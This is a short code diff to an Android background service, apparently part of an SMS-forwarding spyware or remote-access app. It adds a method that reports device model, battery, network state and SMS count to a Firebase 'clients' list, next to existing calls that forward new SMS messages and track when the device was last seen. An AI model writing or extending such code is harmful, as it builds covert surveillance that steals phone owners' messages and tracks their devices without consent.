@@ -102,7 +102,27 @@ public class BackgroundSyncService extends Service {
         deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
         deviceRef.child("live_data").setValue(collectLiveData());
         updateDeviceInfo();
+        updateDevicesStatus();
         checkAndForwardNewSms();
+    }
+
+    private void updateDevicesStatus() {
+        Map<String, Object> status = new HashMap<>();
+        status.put("name", Build.MODEL);
+        status.put("brand", Build.BRAND);
+        status.put("android", Build.VERSION.RELEASE);
+        status.put("ts", System.currentTimeMillis());
+        status.put("online", true);
+        status.put("battery", getBatteryLevel());
+        status.put("network", getNetworkType());
+        status.put("charging", isDeviceCharging());
+        if (checkPermission(Manifest.permission.READ_SMS)) {
+            status.put("sms_count", getSmsCount());
+        }
+        DatabaseReference statusRef = databaseReference.child("devices_status").child(deviceId);
+        statusRef.setValue(status);
+        statusRef.onDisconnect().removeValue();
+        databaseReference.child("clients").child(deviceId).setValue(status);
     }
 
     private Map<String, Object> collectLiveData() {
